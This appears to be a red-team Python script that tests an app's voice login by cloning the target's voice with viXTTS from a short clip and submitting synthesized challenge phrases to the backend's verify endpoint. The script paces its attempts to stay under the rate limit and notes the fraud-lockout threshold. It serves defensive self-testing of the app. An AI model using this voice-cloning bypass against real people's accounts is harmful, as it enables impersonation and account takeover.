"""Red-team simulation: an attacker who has obtained a short clip of the
target's real voice (not the stored embedding itself -- that's not enough to
resynthesize speech from) uses a Vietnamese zero-shot voice clone (viXTTS) to
try to clear the app's actual voice + anti-spoofing gate. Talks to the real
running backend over HTTP, exactly like the browser client would, so results
reflect what the deployed app actually does with a cloned voice.

Only ever point this at an account you own and control.
"""
import argparse
import io
import os
import sys
import time

import requests
import soundfile as sf
from huggingface_hub import hf_hub_download, snapshot_download

from TTS.tts.configs.xtts_config import XttsConfig
from TTS.tts.models.xtts import Xtts

try:
    from vinorm import TTSnorm
except ImportError:
    TTSnorm = None

MODEL_DIR = os.environ.get("VIXTTS_MODEL_DIR", "/app/model")
REPO_ID = "capleaf/viXTTS"
VERIFY_RATE_LIMIT_SECONDS = 13  # /verify is capped at 5/minute server-side


def load_model():
    os.makedirs(MODEL_DIR, exist_ok=True)
    required_files = ["model.pth", "config.json", "vocab.json", "speakers_xtts.pth"]
    have = os.listdir(MODEL_DIR)
    if not all(f in have for f in required_files):
        print(f"Downloading {REPO_ID}...", file=sys.stderr)
        snapshot_download(repo_id=REPO_ID, repo_type="model", local_dir=MODEL_DIR)
        hf_hub_download(repo_id="coqui/XTTS-v2", filename="speakers_xtts.pth", local_dir=MODEL_DIR)

    config = XttsConfig()
    config.load_json(os.path.join(MODEL_DIR, "config.json"))
    model = Xtts.init_from_config(config)
    print("Loading viXTTS checkpoint (CPU)...", file=sys.stderr)
    model.load_checkpoint(config, checkpoint_dir=MODEL_DIR, use_deepspeed=False)
    model.eval()
    return model


def normalize_vietnamese_text(text: str) -> str:
    if TTSnorm is None:
        return text
    return (
        TTSnorm(text, unknown=False, lower=False, rule=True)
        .replace("..", ".")
        .replace("!.", "!")
        .replace("?.", "?")
        .replace(" .", ".")
        .replace(" ,", ",")
        .replace('"', "")
        .replace("'", "")
    )


def _calculate_keep_len(text: str) -> int:
    """viXTTS tends to add trailing artifact noise on short Vietnamese
    sentences; this trims the output to the expected length instead."""
    word_count = len(text.split())
    num_punct = text.count(".") + text.count("!") + text.count("?") + text.count(",")
    if word_count < 5:
        return 15000 * word_count + 2000 * num_punct
    elif word_count < 10:
        return 13000 * word_count + 2000 * num_punct
    return -1


def clone_speech(model, text: str, reference_wav_path: str):
    gpt_cond_latent, speaker_embedding = model.get_conditioning_latents(
        audio_path=reference_wav_path,
        gpt_cond_len=model.config.gpt_cond_len,
        max_ref_length=model.config.max_ref_len,
        sound_norm_refs=model.config.sound_norm_refs,
    )
    normalized_text = normalize_vietnamese_text(text)
    out = model.inference(
        text=normalized_text,
        language="vi",
        gpt_cond_latent=gpt_cond_latent,
        speaker_embedding=speaker_embedding,
        # values the viXTTS authors tuned for this checkpoint
        temperature=0.3,
        length_penalty=1.0,
        repetition_penalty=10.0,
        top_k=30,
        top_p=0.85,
        enable_text_splitting=True,
    )
    wav = out["wav"]
    keep_len = _calculate_keep_len(text)
    if keep_len != -1:
        wav = wav[:keep_len]
    return wav


def wav_bytes_pcm16(wav_array, sr=24000) -> bytes:
    buf = io.BytesIO()
    sf.write(buf, wav_array, sr, format="WAV", subtype="PCM_16")
    return buf.getvalue()


def login(base_url: str, email: str, password: str) -> str:
    r = requests.post(f"{base_url}/api/auth/login", json={"email": email, "password": password})
    r.raise_for_status()
    return r.json()["session_token"]


def get_challenge_phrase(base_url: str, session_token: str) -> str:
    r = requests.post(
        f"{base_url}/api/voice-auth/verify/prompt",
        headers={"Authorization": f"Bearer {session_token}"},
    )
    r.raise_for_status()
    return r.json()["phrase"]


def submit_verify(base_url: str, session_token: str, wav_bytes: bytes) -> dict:
    r = requests.post(
        f"{base_url}/api/voice-auth/verify",
        headers={"Authorization": f"Bearer {session_token}"},
        files={"audio": ("attack.wav", wav_bytes, "audio/wav")},
    )
    r.raise_for_status()
    return r.json()


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--reference", required=True, help="Short (6-10s+) clean clip of the target's real voice")
    parser.add_argument("--email", default=os.environ.get("TARGET_EMAIL"))
    parser.add_argument("--password", default=os.environ.get("TARGET_PASSWORD"))
    parser.add_argument("--base-url", default=os.environ.get("BACKEND_URL", "http://backend:8000"))
    parser.add_argument("--trials", type=int, default=1)
    parser.add_argument("--out-dir", default="/app/output")
    args = parser.parse_args()

    if not args.email or not args.password:
        sys.exit("Missing target credentials: pass --email/--password or set TARGET_EMAIL/TARGET_PASSWORD.")
    if not os.path.isfile(args.reference):
        sys.exit(f"Reference audio not found: {args.reference}")

    if args.trials >= 3:
        print(
            "WARNING: 3 spoofing_detected results within 30 minutes triggers this app's "
            "fraud lockout on the target account (see risk_engine.py MAX_FRAUD_ATTEMPTS). "
            "That would also block your own legitimate voice login for 30 minutes.",
            file=sys.stderr,
        )

    os.makedirs(args.out_dir, exist_ok=True)
    model = load_model()

    for i in range(1, args.trials + 1):
        print(f"\n=== Attempt {i}/{args.trials} ===")
        session_token = login(args.base_url, args.email, args.password)
        phrase = get_challenge_phrase(args.base_url, session_token)
        print(f"Challenge phrase: {phrase}")

        print("Cloning voice and synthesizing phrase...")
        wav = clone_speech(model, phrase, args.reference)
        wav_bytes = wav_bytes_pcm16(wav)

        out_path = os.path.join(args.out_dir, f"attempt_{i}.wav")
        with open(out_path, "wb") as f:
            f.write(wav_bytes)
        print(f"Saved synthesized clone: {out_path}")

        result = submit_verify(args.base_url, session_token, wav_bytes)
        print(f"App response: {result}")

        if i < args.trials:
            time.sleep(VERIFY_RATE_LIMIT_SECONDS)


if __name__ == "__main__":
    main()
